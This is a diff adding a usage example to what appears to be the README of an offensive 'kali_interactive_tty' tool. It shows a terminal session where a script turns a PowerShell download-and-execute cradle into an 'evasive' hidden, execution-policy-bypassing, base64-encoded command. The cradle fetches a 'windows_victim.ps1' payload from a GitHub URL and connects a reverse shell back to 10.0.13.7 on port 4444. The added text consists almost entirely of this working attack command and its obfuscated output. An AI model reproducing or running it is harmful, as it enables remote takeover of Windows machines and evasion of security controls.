@@ -64,3 +64,14 @@ reset
 ------------------------------
 Disclaimer: For authorized security testing and administrative purposes only. !!!!!!!
 ------------------------------
+
+
+```text
+┌──(dperez㉿kali)-[~/Desktop/kali_interactive_tty]
+└─$ ./obfuscate_ps.sh 'IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/x86david/multiplatform_kali_interactive_tty/master/windows_victim.ps1"); windows_victim 10.0.13.7 4444'
+
+
+[+] Evasive PowerShell Command Generated:
+
+powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AeAA4ADYAZABhAHYAaQBkAC8AbQB1AGwAdABpAHAAbABhAHQAZgBvAHIAbQBfAGsAYQBsAGkAXwBpAG4AdABlAHIAYQBjAHQAaQB2AGUAXwB0AHQAeQAvAG0AYQBzAHQAZQByAC8AdwBpAG4AZABvAHcAcwBfAHYAaQBjAHQAaQBtAC4AcABzADEAIgApADsAIAB3AGkAbgBkAG8AdwBzAF8AdgBpAGMAdABpAG0AIAAxADAALgAwAC4AMQAzAC4ANwAgADQANAA0ADQA
+```
